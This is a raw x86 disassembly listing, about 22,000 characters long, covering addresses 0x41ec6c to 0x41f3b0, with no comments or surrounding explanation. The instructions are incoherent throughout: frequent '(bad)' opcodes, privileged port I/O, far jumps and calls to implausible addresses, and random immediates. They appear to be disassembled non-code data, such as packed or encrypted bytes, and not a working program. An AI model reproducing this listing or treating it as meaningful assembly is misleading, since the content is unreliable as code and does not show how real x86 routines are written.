  41ec6c:	mov    BYTE PTR [ecx],al
  41ec6e:	lods   al,BYTE PTR ds:[esi]
  41ec6f:	les    esi,FWORD PTR [edx+0x60]
  41ec72:	pop    ds
  41ec73:	mov    DWORD PTR [ebp+0x74f082a8],0x97dbee46
  41ec7d:	mov    eax,DWORD PTR [edi+0x630baf4f]
  41ec83:	mov    eax,ds:0x801db982
  41ec88:	shl    BYTE PTR [edi+0x10],1
  41ec8b:	jmp    0x41ecf0
  41ec8d:	push   ebp
  41ec8e:	jmp    0x9627e59
  41ec93:	push   ecx
  41ec94:	pop    edi
  41ec95:	ror    esi,cl
  41ec97:	mov    al,ds:0xefcfbc31
  41ec9c:	bnd jb 0x41ec3c
  41ec9f:	ja     0x41ecff
  41eca1:	imul   edx,DWORD PTR cs:[ebx+0xbfa7acd],0x88a960c2
  41ecac:	(bad)  
  41ecad:	push   esp
  41ecae:	mov    cl,0x23
  41ecb0:	daa    
  41ecb1:	in     eax,dx
  41ecb2:	fdivr  DWORD PTR [edi]
  41ecb4:	pop    edi
  41ecb5:	stos   DWORD PTR es:[edi],eax
  41ecb6:	scas   eax,DWORD PTR es:[edi]
  41ecb7:	pop    edi
  41ecb8:	inc    eax
  41ecb9:	leave  
  41ecba:	retf   
  41ecbb:	jne    0x41ec9b
  41ecbd:	push   esp
  41ecbe:	push   ds
  41ecbf:	(bad)  
  41ecc0:	xor    DWORD PTR [edi+0x6833ac70],edi
  41ecc6:	outs   dx,BYTE PTR ds:[esi]
  41ecc7:	sub    eax,DWORD PTR [edi-0x4bfea8aa]
  41eccd:	lock out dx,al
  41eccf:	jmp    0x929:0x4ae3c9dd
  41ecd6:	mov    edx,0x623b3da5
  41ecdb:	push   ecx
  41ecdc:	pop    es
  41ecdd:	mov    eax,ds:0x504f5545
  41ece2:	lock (bad) 
  41ece4:	and    DWORD PTR [eax-0x7],ebp
  41ece7:	shl    BYTE PTR [ebx+0x2],0x9c
  41eceb:	mov    al,ds:0xa28559da
  41ecf0:	stos   DWORD PTR es:[edi],eax
  41ecf1:	cmp    al,0xa8
  41ecf3:	lock fsubp st(5),st
  41ecf6:	iret   
  41ecf7:	ret    0x885e
  41ecfa:	sbb    BYTE PTR [ecx+0x1c9509b9],dl
  41ed00:	adc    DWORD PTR [ecx-0x6c],esp
  41ed03:	adc    al,0xd5
  41ed05:	add    BYTE PTR [edx+0x16cba7],al
  41ed0b:	popf   
  41ed0c:	sub    eax,0x10a96e99
  41ed11:	in     eax,0x95
  41ed13:	sbb    cl,0x60
  41ed16:	mov    ecx,0xd0ab736e
  41ed1b:	int    0x2f
  41ed1d:	xor    eax,0xcca55eee
  41ed22:	push   ss
  41ed23:	ins    DWORD PTR es:[edi],dx
  41ed24:	sub    bl,BYTE PTR [edi+eiz*4+0x729e12a0]
  41ed2b:	mov    ds,WORD PTR [edi+0x6b]
  41ed2e:	inc    esp
  41ed2f:	jns    0x41ed8f
  41ed31:	test   al,0x5c
  41ed33:	jno    0x41ed7a
  41ed35:	fmul   QWORD PTR [ecx+0x3260f54f]
  41ed3b:	in     eax,dx
  41ed3c:	pop    ebx
  41ed3d:	or     DWORD PTR [esi-0x42],esi
  41ed40:	aaa    
  41ed41:	sub    dh,0x27
  41ed44:	mov    ah,0x5f
  41ed46:	rcl    BYTE PTR [ebx-0x52d70dbb],cl
  41ed4c:	mov    dl,BYTE PTR [edx]
  41ed4e:	out    dx,al
  41ed4f:	std    
  41ed50:	cmp    eax,ecx
  41ed52:	aaa    
  41ed53:	jae    0x41ed8a
  41ed55:	imul   dh
  41ed57:	push   esi
  41ed58:	jmp    0x4e25d3f0
  41ed5d:	and    edx,0xffffffa0
  41ed60:	mov    edi,0x1a9bac45
  41ed65:	leave  
  41ed66:	enter  0x5b0c,0x9b
  41ed6a:	push   DWORD PTR [esi-0x31]
  41ed6d:	push   ss
  41ed6e:	scas   al,BYTE PTR es:[edi]
  41ed6f:	push   0xa1e6d475
  41ed74:	pop    esp
  41ed75:	push   edx
  41ed76:	ldmxcsr DWORD PTR [ebx]
  41ed79:	sbb    eax,0x8a0948e1
  41ed7e:	out    dx,al
  41ed7f:	mov    bh,0xab
  41ed81:	call   FWORD PTR ds:0x73a0dfa4
  41ed87:	mov    al,ds:0xbdfe27ee
  41ed8c:	and    BYTE PTR [edi+0xe8b30f],ch
  41ed92:	into   
  41ed93:	mov    al,ds:0x67a7c555
  41ed98:	ret    0x2f3
  41ed9b:	add    DWORD PTR [ecx],0xffffffea
  41ed9e:	jg     0x41ee1c
  41eda0:	pop    ebp
  41eda1:	pushf  
  41eda2:	dec    esi
  41eda3:	add    BYTE PTR [esi-0x1b3fa951],dh
  41eda9:	pusha  
  41edaa:	je     0x41ed79
  41edac:	imul   ecx,esp,0xffffff99
  41edaf:	loopne 0x41edca
  41edb1:	inc    ebx
  41edb2:	out    dx,al
  41edb3:	fwait
  41edb4:	dec    eax
  41edb5:	scas   al,BYTE PTR es:[edi]
  41edb6:	cmp    esi,edx
  41edb8:	inc    esp
  41edb9:	(bad)  
  41edba:	sub    esp,DWORD PTR [ecx-0x7294b785]
  41edc0:	pop    es
  41edc1:	dec    DWORD PTR [ebx+0x4a]
  41edc4:	pop    esi
  41edc5:	pop    ss
  41edc6:	or     edx,DWORD PTR es:[eax-0x61]
  41edca:	addr16 aaa 
  41edcc:	and    eax,0x2a775043
  41edd1:	and    DWORD PTR [esi-0x3f],ecx
  41edd4:	out    0x9d,al
  41edd6:	inc    ecx
  41edd7:	mov    BYTE PTR [esi+0x24],bl
  41edda:	and    ebp,edi
  41eddc:	jmp    0x41edfe
  41edde:	pop    es
  41eddf:	mov    dh,0x1f
  41ede1:	leave  
  41ede2:	div    DWORD PTR [esi-0x72]
  41ede5:	push   ecx
  41ede6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ede7:	aad    0x6c
  41ede9:	sar    edi,cl
  41edeb:	(bad)  
  41edec:	mov    esi,0x39ed6f59
  41edf1:	popa   
  41edf2:	sub    BYTE PTR [esi-0x17],dl
  41edf5:	pop    edx
  41edf6:	out    dx,al
  41edf7:	rol    DWORD PTR [ebx-0x26],0xda
  41edfb:	ja     0x41ee27
  41edfd:	and    DWORD PTR [ecx-0x5f],esi
  41ee00:	shl    BYTE PTR [ebx],0x16
  41ee03:	or     ecx,DWORD PTR [esi+0x5ea6a562]
  41ee09:	loopne 0x41ed96
  41ee0b:	mov    ds:0x93092797,eax
  41ee10:	or     BYTE PTR [eax+0x14],ah
  41ee13:	mov    BYTE PTR [edi-0x24],ch
  41ee16:	xor    eax,0xe98b45f
  41ee1b:	pop    es
  41ee1c:	ins    BYTE PTR es:[edi],dx
  41ee1d:	jns    0x41ee0c
  41ee1f:	loopne 0x41ee6b
  41ee21:	(bad)  
  41ee22:	mov    esi,0x3a152d68
  41ee27:	in     al,dx
  41ee28:	add    esp,DWORD PTR [ecx+0x20]
  41ee2b:	inc    ecx
  41ee2c:	jl     0x41eded
  41ee2e:	daa    
  41ee2f:	sub    eax,0x74ee7eae
  41ee34:	or     al,0x57
  41ee36:	std    
  41ee37:	(bad)  
  41ee38:	retf   
  41ee39:	mov    bh,0x19
  41ee3b:	mov    eax,ds:0x41668188
  41ee40:	xchg   ecx,eax
  41ee41:	jmp    0x70a0b58c
  41ee46:	outs   dx,DWORD PTR ds:[esi]
  41ee47:	daa    
  41ee48:	jb     0x41ee51
  41ee4a:	sub    eax,0x7a613d4a
  41ee4f:	inc    eax
  41ee50:	sar    dl,cl
  41ee52:	lea    edi,[ebp-0x52]
  41ee55:	xchg   ecx,eax
  41ee56:	out    dx,al
  41ee57:	mov    ch,0xe6
  41ee59:	fist   DWORD PTR [ecx]
  41ee5b:	or     al,0xd4
  41ee5d:	int    0x73
  41ee5f:	pushf  
  41ee60:	enter  0x4213,0xb5
  41ee64:	pop    esi
  41ee65:	cwde   
  41ee66:	push   edx
  41ee67:	(bad)  
  41ee69:	hlt    
  41ee6a:	jmp    0x41ee12
  41ee6c:	imul   ecx,DWORD PTR [eax-0x574848c7],0x60e0f88c
  41ee76:	pop    esi
  41ee77:	mov    ch,BYTE PTR [edx+0x7c483f21]
  41ee7d:	ret    
  41ee7e:	(bad)  
  41ee7f:	cmp    BYTE PTR [eax],ah
  41ee81:	lods   eax,DWORD PTR ds:[esi]
  41ee82:	cs out 0x3b,al
  41ee85:	xor    ebx,DWORD PTR [ebp-0x47850051]
  41ee8b:	pop    ecx
  41ee8c:	push   edi
  41ee8d:	pop    eax
  41ee8e:	adc    eax,0x6f455e65
  41ee93:	imul   ebx,DWORD PTR [ebp+0x16d4f305],0x4b
  41ee9a:	pop    ss
  41ee9b:	and    DWORD PTR [ebx+0x44],edx
  41ee9e:	pop    ebx
  41ee9f:	loop   0x41ee67
  41eea1:	pusha  
  41eea2:	or     al,BYTE PTR [edi]
  41eea4:	mov    WORD PTR [esi],fs
  41eea6:	pop    edx
  41eea7:	adc    cl,al
  41eea9:	pop    eax
  41eeaa:	out    dx,al
  41eeab:	xor    al,0x46
  41eead:	aad    0xef
  41eeaf:	sbb    bh,BYTE PTR [ecx+0x2c]
  41eeb2:	dec    edi
  41eeb3:	mov    eax,ds:0x8eb868c7
  41eeb8:	or     al,bh
  41eeba:	nop
  41eebb:	mov    bh,0x64
  41eebd:	sbb    ecx,DWORD PTR [ebx-0x5b]
  41eec0:	in     eax,dx
  41eec1:	mov    al,ds:0xfceb2aec
  41eec6:	mov    ebx,0x59c8d1ab
  41eecb:	imul   esp,DWORD PTR [ebx+0x5e],0x102e4c97
  41eed2:	iret   
  41eed3:	adc    esi,0x80c1474c
  41eed9:	(bad)  
  41eeda:	out    dx,al
  41eedb:	je     0x41ef11
  41eedd:	mov    ebp,0x15bd307a
  41eee2:	fisubr DWORD PTR [ebx-0x5f2344b8]
  41eee8:	adc    al,0x42
  41eeea:	jmp    0x5ecf:0xf0a35dcb
  41eef1:	gs mov ch,0x62
  41eef4:	xor    ch,dl
  41eef6:	sahf   
  41eef7:	jmp    0x450a4168
  41eefc:	add    ch,cl
  41eefe:	(bad)  
  41eeff:	cld    
  41ef00:	add    DWORD PTR [esi-0x7c],0xfffffff1
  41ef04:	jno    0x41ef42
  41ef06:	out    dx,al
  41ef07:	mov    ecx,0x8c434f9c
  41ef0c:	daa    
  41ef0d:	add    bl,BYTE PTR [eax+ebp*4]
  41ef10:	outs   dx,BYTE PTR ds:[esi]
  41ef11:	fsub   QWORD PTR ds:0x2bcec436
  41ef17:	jg     0x41eeac
  41ef19:	(bad)  
  41ef1a:	push   esp
  41ef1b:	fistp  WORD PTR [esi+0x79]
  41ef1e:	mov    ah,0x48
  41ef20:	or     eax,0x184f5eeb
  41ef25:	lds    ebp,FWORD PTR [ebx+0x68]
  41ef28:	leave  
  41ef29:	cs push esp
  41ef2b:	and    esi,ebx
  41ef2d:	ss dec esi
  41ef2f:	stos   DWORD PTR es:[edi],eax
  41ef30:	nop
  41ef31:	inc    ebp
  41ef32:	push   edx
  41ef33:	neg    BYTE PTR [esi-0x74]
  41ef36:	cwde   
  41ef37:	push   cs
  41ef38:	push   ds
  41ef39:	out    dx,al
  41ef3a:	cs fwait
  41ef3c:	test   BYTE PTR [ebp+0x60],dl
  41ef3f:	mov    bh,0x6e
  41ef41:	or     eax,0x796abd6b
  41ef46:	pop    esi
  41ef47:	stos   BYTE PTR es:[edi],al
  41ef48:	xchg   edx,eax
  41ef49:	push   ds
  41ef4a:	out    dx,al
  41ef4b:	dec    ebx
  41ef4c:	or     DWORD PTR [ecx],esp
  41ef4e:	fidivr WORD PTR [esi]
  41ef50:	loopne 0x41efbb
  41ef52:	jmp    0xa10c:0x4e00eca7
  41ef59:	pusha  
  41ef5a:	(bad)  
  41ef5b:	cmp    al,0x43
  41ef5d:	xchg   bh,ah
  41ef5f:	mov    dl,0x80
  41ef61:	jl     0x41ef6c
  41ef63:	call   0xbc5c8f66
  41ef68:	outs   dx,BYTE PTR ds:[esi]
  41ef69:	pop    ebp
  41ef6a:	popf   
  41ef6b:	jl     0x41efd8
  41ef6d:	inc    ebx
  41ef6e:	test   al,0x19
  41ef70:	(bad)  
  41ef71:	dec    esi
  41ef72:	add    BYTE PTR [edi],dl
  41ef74:	inc    edx
  41ef75:	inc    esi
  41ef76:	xchg   edi,ebx
  41ef78:	pop    ebx
  41ef79:	or     DWORD PTR [eax+0x64],edx
  41ef7c:	jle    0x41ef66
  41ef7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef7f:	push   eax
  41ef80:	dec    esp
  41ef81:	popa   
  41ef82:	pop    ds
  41ef83:	xchg   DWORD PTR [edi+0x10],eax
  41ef86:	mov    al,ds:0x207eff93
  41ef8b:	cmc    
  41ef8c:	mov    ebx,DWORD PTR [ebp+0x71]
  41ef8f:	xor    bh,BYTE PTR [ebx-0x6c67a21]
  41ef95:	iret   
  41ef96:	jp     0x41ef41
  41ef98:	and    DWORD PTR [ebx+0x27c9dcee],eax
  41ef9e:	mov    DWORD PTR [edx],ebp
  41efa0:	or     al,BYTE PTR [eax-0x12]
  41efa3:	repnz gs mov ah,0xa2
  41efa7:	pop    edi
  41efa8:	addr16 call 0xe23b:0xd7af8f00
  41efb0:	fstp   QWORD PTR [edi+edx*4+0x253047e5]
  41efb7:	jns    0x41ef74
  41efb9:	push   edx
  41efba:	out    0xa4,eax
  41efbc:	push   edx
  41efbd:	aaa    
  41efbe:	push   ebp
  41efbf:	xchg   edx,eax
  41efc0:	sahf   
  41efc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efc2:	js     0x41efd9
  41efc4:	add    al,0x61
  41efc6:	jecxz  0x41f027
  41efc8:	(bad)  
  41efc9:	(bad)  
  41efca:	(bad)  
  41efcc:	or     dl,BYTE PTR [eax+0x1c5eab52]
  41efd2:	dec    ecx
  41efd3:	int3   
  41efd4:	sub    BYTE PTR [ebp+0x5f8975e4],bh
  41efda:	xchg   BYTE PTR [edx+0x7f],ch
  41efdd:	lds    ebx,FWORD PTR [esi+0x6cc0a26b]
  41efe3:	pop    edi
  41efe4:	pop    esi
  41efe5:	mov    ah,0xc7
  41efe7:	mov    ax,ds:0x56634824
  41efed:	add    DWORD PTR [edi-0x77d25320],eax
  41eff3:	test   al,0x7d
  41eff5:	jg     0x41f06f
  41eff7:	dec    ebp
  41eff8:	fwait
  41eff9:	pusha  
  41effa:	lds    edi,FWORD PTR [eax]
  41effc:	jl     0x41ef80
  41effe:	out    dx,al
  41efff:	mov    ch,0x8c
  41f001:	cmp    BYTE PTR [edx+0x5f31fe37],cl
  41f007:	mov    eax,ds:0x4a522327
  41f00c:	xor    ebx,ebx
  41f00e:	cmp    DWORD PTR [esi+ebx*2],0x354cf71b
  41f015:	mov    esi,0x609aebdd
  41f01a:	loop   0x41efe7
  41f01c:	shl    BYTE PTR [ecx+0x673468ac],1
  41f022:	out    dx,al
  41f023:	or     BYTE PTR [esi-0x418256c3],bl
  41f029:	jb     0x41efb7
  41f02b:	mov    eax,ds:0xc66bacf0
  41f030:	sub    bl,ch
  41f032:	(bad)  
  41f033:	push   ecx
  41f034:	pop    esi
  41f035:	mov    ds:0xabbcee78,eax
  41f03a:	arpl   WORD PTR [esi+edi*4],dx
  41f03d:	pusha  
  41f03e:	mov    edx,0xac6e1883
  41f043:	dec    esp
  41f044:	or     eax,0x452beed4
  41f049:	jo     0x41f04e
  41f04b:	dec    esi
  41f04c:	push   ds
  41f04d:	add    bh,BYTE PTR [ebp-0x5f]
  41f050:	jo     0x41f016
  41f052:	add    BYTE PTR [esi+0x2f6039ba],0x76
  41f059:	addr16 in eax,0x63
  41f05c:	pusha  
  41f05d:	jl     0x41f00e
  41f05f:	scas   al,BYTE PTR es:[edi]
  41f060:	sbb    BYTE PTR [ebx+0x11],al
  41f063:	popa   
  41f064:	repz jmp 0xd106:0x5a17a0e0
  41f06c:	dec    ecx
  41f06d:	mov    ecx,0x37786132
  41f072:	out    dx,al
  41f073:	out    0x61,al
  41f075:	retf   0x460b
  41f078:	adc    ch,ah
  41f07a:	mov    dh,0xa0
  41f07c:	or     BYTE PTR [ebp+0x15],bl
  41f07f:	mov    bh,0x74
  41f081:	ret    0xb836
  41f084:	pop    esi
  41f085:	add    BYTE PTR [esi+0x7fac3bd],0x49
  41f08c:	sbb    BYTE PTR [ecx-0x4a],ah
  41f08f:	mov    eax,0x200f34c4
  41f094:	mov    cl,0x3
  41f096:	out    dx,al
  41f097:	scas   eax,DWORD PTR es:[edi]
  41f098:	or     DWORD PTR [di+0x39],eax
  41f09c:	loope  0x41f049
  41f09e:	mul    BYTE PTR [eax-0x1e02a7ff]
  41f0a4:	mov    ebx,0x426ec274
  41f0a9:	jge    0x41f120
  41f0ab:	stc    
  41f0ac:	push   esp
  41f0ad:	and    ah,cl
  41f0af:	and    cl,ah
  41f0b1:	xor    edi,DWORD PTR [ebp+0x4c]
  41f0b4:	std    
  41f0b5:	mov    esi,0x169ba117
  41f0ba:	xchg   edx,eax
  41f0bb:	fisttp WORD PTR [edi-0x6c]
  41f0be:	sub    al,0x34
  41f0c0:	pop    esi
  41f0c1:	ret    0x8d36
  41f0c4:	inc    edx
  41f0c5:	mul    cl
  41f0c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0c8:	or     DWORD PTR [edx-0x6],ebx
  41f0cb:	loop   0x41f113
  41f0cd:	dec    ebx
  41f0ce:	call   0x29d5ced2
  41f0d3:	mov    ?,WORD PTR [ebx-0x7c]
  41f0d6:	sub    edi,edi
  41f0d8:	pop    esi
  41f0d9:	in     eax,dx
  41f0da:	inc    esi
  41f0db:	stos   DWORD PTR es:[edi],eax
  41f0dc:	scas   al,BYTE PTR es:[edi]
  41f0dd:	outs   dx,DWORD PTR ds:[esi]
  41f0de:	cmp    DWORD PTR [eax],edi
  41f0e0:	push   esp
  41f0e1:	popa   
  41f0e2:	jle    0x41f087
  41f0e4:	mov    cl,0xde
  41f0e6:	cmp    ah,BYTE PTR [edx+ebp*1+0x21eee1c]
  41f0ed:	mov    BYTE PTR [edx],dl
  41f0ef:	imul   esi,DWORD PTR [eax],0x28a11d76
  41f0f5:	cld    
  41f0f6:	cmp    ecx,DWORD PTR [eax+0x4a]
  41f0f9:	xchg   ecx,eax
  41f0fa:	call   0xf2084c18
  41f0ff:	inc    esp
  41f100:	loope  0x41f17e
  41f102:	outs   dx,BYTE PTR ds:[esi]
  41f103:	xor    edx,0xffffffc3
  41f106:	sbb    al,0xa1
  41f108:	shr    BYTE PTR [esi+0x70d5413a],0x6
  41f10f:	cmp    BYTE PTR [esi+0x19],bl
  41f112:	pop    esi
  41f113:	mov    ebp,DWORD PTR [edi]
  41f115:	aam    0xc3
  41f117:	pop    ebp
  41f118:	pop    es
  41f119:	popa   
  41f11a:	adc    BYTE PTR [ecx-0x7d],bh
  41f11d:	(bad)  
  41f11e:	aas    
  41f11f:	pop    ebx
  41f120:	dec    ebx
  41f121:	popf   
  41f122:	out    dx,al
  41f123:	mov    ebx,0x9d69cf7c
  41f128:	test   eax,0xc5a8687a
  41f12d:	lock lods eax,DWORD PTR fs:[esi]
  41f130:	test   DWORD PTR [ebp-0x53],ebx
  41f133:	mov    ?,WORD PTR [esi-0x12]
  41f136:	push   ss
  41f137:	mov    bh,0x5e
  41f139:	sar    BYTE PTR [edi+ecx*2+0x6d7ac206],cl
  41f140:	cmc    
  41f141:	inc    edx
  41f142:	test   DWORD PTR [esi-0x29a85f67],ebx
  41f148:	xchg   ebp,eax
  41f149:	fs fs cmc 
  41f14c:	pop    esi
  41f14d:	lods   al,BYTE PTR ds:[esi]
  41f14e:	stos   DWORD PTR es:[edi],eax
  41f14f:	fisttp QWORD PTR [edx-0x20d28a05]
  41f155:	pusha  
  41f156:	and    BYTE PTR [edi-0x25],cl
  41f159:	fimul  WORD PTR ds:0xeba74869
  41f15f:	retf   
  41f160:	icebp  
  41f161:	inc    ebp
  41f162:	hlt    
  41f163:	and    BYTE PTR [edi-0x6c05ed00],bl
  41f169:	inc    ecx
  41f16a:	imul   ebp,DWORD PTR [ebp-0x1a9ddeae],0x26
  41f171:	xchg   esp,eax
  41f172:	adc    BYTE PTR [ebx+eiz*2-0x6ad4eba8],ch
  41f179:	arpl   WORD PTR [esi],bp
  41f17b:	ins    BYTE PTR es:[edi],dx
  41f17c:	in     al,0x15
  41f17e:	sahf   
  41f17f:	jp     0x41f19f
  41f181:	popa   
  41f182:	or     al,0x36
  41f184:	nop
  41f185:	or     cl,bh
  41f187:	hlt    
  41f188:	push   ebx
  41f189:	fiadd  DWORD PTR [ecx]
  41f18b:	stos   DWORD PTR es:[edi],eax
  41f18c:	out    dx,al
  41f18d:	jl     0x41f1fd
  41f18f:	gs push ebp
  41f191:	mov    ah,0x71
  41f193:	mov    ecx,0x2252727b
  41f198:	add    DWORD PTR [ecx+0x6],esp
  41f19b:	mov    ecx,DWORD PTR [ecx-0x7aec86a5]
  41f1a1:	xchg   ecx,eax
  41f1a2:	mov    ds:0x27dddec4,eax
  41f1a7:	mov    ah,0x5e
  41f1a9:	adc    DWORD PTR [ebp-0x461ab458],ecx
  41f1af:	cli    
  41f1b0:	scas   eax,DWORD PTR es:[edi]
  41f1b1:	adc    al,0x52
  41f1b3:	push   esp
  41f1b4:	gs inc ebx
  41f1b6:	rol    DWORD PTR [edi],0xde
  41f1b9:	mov    ecx,ecx
  41f1bb:	and    eax,0xf424b084
  41f1c0:	fcmovnu st,st(5)
  41f1c2:	pop    esp
  41f1c3:	push   cs
  41f1c4:	es dec esp
  41f1c6:	xchg   ebp,eax
  41f1c7:	pop    eax
  41f1c8:	outs   dx,BYTE PTR ds:[esi]
  41f1c9:	aas    
  41f1ca:	sbb    al,0xf1
  41f1cc:	mov    eax,ds:0xbaeea622
  41f1d1:	pusha  
  41f1d2:	out    0xaa,eax
  41f1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1d5:	pop    esi
  41f1d6:	fs mov esi,0xf8eeb997
  41f1dc:	mov    ebx,0xb332e8eb
  41f1e1:	push   ecx
  41f1e2:	arpl   WORD PTR [edi-0x15707acd],bx
  41f1e8:	sti    
  41f1e9:	sti    
  41f1ea:	xchg   edi,eax
  41f1eb:	shl    eax,0x71
  41f1ee:	mov    ebp,ebp
  41f1f0:	pop    esi
  41f1f1:	xchg   ebp,eax
  41f1f2:	push   ebp
  41f1f3:	mov    ch,BYTE PTR [eax+0x6857c337]
  41f1f9:	dec    edi
  41f1fa:	xor    edx,esi
  41f1fc:	rol    BYTE PTR [esi+edx*4-0x21],0x33
  41f201:	jbe    0x41f251
  41f203:	push   ss
  41f204:	adc    BYTE PTR [ebx-0x45a1c7ea],al
  41f20a:	jle    0x41f252
  41f20c:	xchg   edi,eax
  41f20d:	mov    al,ds:0x5dd0288d
  41f212:	adc    eax,0x535da61f
  41f217:	aaa    
  41f218:	xchg   BYTE PTR [edi+0x6c5f2a09],al
  41f21e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41f220:	mov    bh,0xb3
  41f222:	cdq    
  41f223:	adc    DWORD PTR [ecx],ebx
  41f225:	cs cmc 
  41f227:	les    eax,FWORD PTR [ebx+0x52a28f53]
  41f22d:	dec    ecx
  41f22e:	or     BYTE PTR [eax],al
  41f230:	rcl    BYTE PTR [eax+0x165e789f],1
  41f236:	mov    ecx,DWORD PTR [edi+eiz*2]
  41f239:	sahf   
  41f23a:	mov    esp,cs
  41f23c:	sbb    eax,0xf85e75a
  41f241:	test   dl,0xf0
  41f244:	scas   eax,DWORD PTR es:[edi]
  41f245:	push   cs
  41f246:	xor    BYTE PTR [edi-0x59ceeaa2],ch
  41f24c:	mov    dl,0x73
  41f24e:	mov    cl,0x1f
  41f250:	mov    esp,DWORD PTR [eax-0x67]
  41f253:	mov    esp,0xc31e2c66
  41f258:	pop    es
  41f259:	aam    0xee
  41f25b:	popa   
  41f25c:	cmp    eax,0xe5625fd
  41f261:	xchg   edx,eax
  41f262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f263:	mov    eax,ds:0x2d204146
  41f268:	and    eax,DWORD PTR [esi+0x3c805900]
  41f26e:	jle    0x41f223
  41f270:	pop    esi
  41f271:	sbb    eax,DWORD PTR [ebp+0x16a077be]
  41f277:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41f279:	jb     0x41f2cb
  41f27b:	iret   
  41f27c:	and    BYTE PTR [eax+0x6e],0x8b
  41f280:	lods   al,BYTE PTR ds:[esi]
  41f281:	(bad)  
  41f282:	xor    DWORD PTR [esi+ebx*2+0x68],edi
  41f286:	mov    dh,BYTE PTR [ecx]
  41f288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f289:	(bad)  
  41f28b:	mov    dh,0xbf
  41f28d:	pusha  
  41f28e:	js     0x41f302
  41f290:	push   ebx
  41f291:	inc    eax
  41f292:	jnp    0x41f2a3
  41f294:	retf   0xa26
  41f297:	mov    cl,0x34
  41f299:	in     al,dx
  41f29a:	out    dx,al
  41f29b:	call   0x209af9e0
  41f2a0:	frstor [eax-0x42]
  41f2a3:	mov    dl,0xc5
  41f2a5:	push   ebx
  41f2a6:	push   es
  41f2a7:	lea    esi,[ebx-0x584115c2]
  41f2ad:	and    DWORD PTR [ebp+ebx*8-0x22],ebx
  41f2b1:	retf   0xb4bd
  41f2b4:	cmc    
  41f2b5:	inc    ebx
  41f2b6:	mov    ecx,0x64213a1f
  41f2bb:	and    esi,DWORD PTR [ebx+0x5e7b581e]
  41f2c1:	mov    ds,ecx
  41f2c3:	sar    DWORD PTR ds:0x5555984b,cl
  41f2c9:	popa   
  41f2ca:	mov    eax,ds:0x4bb36057
  41f2cf:	cmp    dl,BYTE PTR [esp+edi*8]
  41f2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2d3:	repz pop esi
  41f2d5:	loopne 0x41f2df
  41f2d7:	repnz aaa 
  41f2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2da:	pop    es
  41f2db:	mov    ?,eax
  41f2dd:	pusha  
  41f2de:	out    0xbe,al
  41f2e0:	pop    ebx
  41f2e1:	cmp    DWORD PTR [eax*4-0x5711c696],edi
  41f2e8:	inc    eax
  41f2e9:	dec    ebp
  41f2ea:	test   DWORD PTR [edi],eax
  41f2ec:	pop    ss
  41f2ed:	push   ss
  41f2ee:	pushf  
  41f2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2f0:	pmulhuw mm6,QWORD PTR [ebx]
  41f2f3:	mov    WORD PTR [esi+eax*4+0x68],bp
  41f2f8:	pop    ebp
  41f2f9:	adc    esi,ebp
  41f2fb:	jb     0x41f2c0
  41f2fd:	scas   eax,DWORD PTR es:[edi]
  41f2fe:	out    0xf0,eax
  41f300:	sub    esi,edi
  41f302:	push   ebp
  41f303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f304:	and    al,0x48
  41f306:	or     al,0xc6
  41f308:	test   DWORD PTR [edx+0x66],0xdecda8c0
  41f30f:	mov    dh,0x5e
  41f311:	out    0xaa,al
  41f313:	push   ss
  41f314:	outs   dx,BYTE PTR ds:[esi]
  41f315:	jo     0x41f345
  41f317:	dec    ebx
  41f318:	and    esp,DWORD PTR [ecx+0x55]
  41f31b:	dec    ecx
  41f31c:	sbb    al,0xe0
  41f31e:	add    BYTE PTR [ebx+0x5a],al
  41f321:	or     ebp,ebp
  41f323:	std    
  41f324:	daa    
  41f325:	jp     0x41f30b
  41f327:	loopne 0x41f2ef
  41f329:	cmc    
  41f32a:	inc    edx
  41f32b:	rcr    BYTE PTR [esi-0x605ee14a],1
  41f331:	add    bh,BYTE PTR ds:0x3a24b242
  41f337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f338:	pop    esi
  41f339:	xchg   esp,eax
  41f33a:	(bad)  
  41f33b:	mov    edi,0x1774df1d
  41f340:	mov    dh,0x60
  41f342:	shr    BYTE PTR [edx],1
  41f344:	add    BYTE PTR [ebx],ah
  41f346:	imul   edx,DWORD PTR [ebp+0x3feb18f1],0x7b
  41f34d:	addr16 xor esp,ecx
  41f350:	fsub   DWORD PTR [eax-0x42b2d354]
  41f356:	iret   
  41f357:	mov    al,ds:0x11d6dcfe
  41f35c:	out    dx,eax
  41f35d:	shl    esi,1
  41f35f:	jb     0x41f3bf
  41f361:	sub    DWORD PTR [esi+0x5e4a0217],edi
  41f367:	dec    edi
  41f368:	popa   
  41f369:	popa   
  41f36a:	aaa    
  41f36b:	sar    BYTE PTR [eax],0x74
  41f36e:	test   al,0x78
  41f370:	mov    ebp,0xd0e0081c
  41f375:	aas    
  41f376:	out    dx,al
  41f377:	mov    ds:0x5bf7ac50,al
  41f37c:	xchg   DWORD PTR [eax+0x5f],esp
  41f37f:	xor    DWORD PTR [edx+eax*2-0x3d306b4],eax
  41f386:	out    dx,al
  41f387:	adc    BYTE PTR [edx+0xa],bl
  41f38a:	ins    BYTE PTR es:[edi],dx
  41f38b:	mov    dl,0x41
  41f38d:	xchg   ebp,eax
  41f38e:	(bad)  
  41f390:	loope  0x41f336
  41f392:	xchg   esp,eax
  41f393:	lods   al,BYTE PTR ds:[esi]
  41f394:	in     al,dx
  41f395:	fldcw  WORD PTR [edx+0x6e4f5797]
  41f39b:	pop    edx
  41f39c:	push   esi
  41f39d:	mov    bh,0xf0
  41f39f:	xchg   ebx,eax
  41f3a0:	push   cs
  41f3a1:	ret    
  41f3a2:	dec    eax
  41f3a3:	mov    eax,ds:0xa2348a5b
  41f3a8:	or     dh,bh
  41f3aa:	lock fidiv WORD PTR [edx-0x3a]
  41f3ae:	cmp    ecx,eax
  41f3b0:	sbb    al,0xc6
